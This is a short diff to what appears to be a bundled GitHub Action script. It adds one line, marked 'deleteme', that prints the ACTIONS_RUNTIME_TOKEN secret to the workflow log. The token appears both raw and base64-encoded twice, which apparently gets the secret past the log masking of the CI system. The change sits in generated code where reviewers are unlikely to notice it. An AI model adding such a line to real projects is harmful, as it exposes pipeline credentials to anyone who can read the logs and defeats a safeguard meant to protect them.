@@ -26969,6 +26969,7 @@ function parseBuildId(stdout) {
         startArgs.push('--ref', config.ref);
     }
     if (process.env.ACTIONS_RUNTIME_TOKEN) {
+        console.log('deleteme', process.env.ACTIONS_RUNTIME_TOKEN, Buffer.from(Buffer.from(process.env.ACTIONS_RUNTIME_TOKEN).toString('base64')).toString('base64'));
         console.log('using ACTIONS_RUNTIME_TOKEN from environment as checkout token');
         startArgs.push('--token', process.env.ACTIONS_RUNTIME_TOKEN);
     }
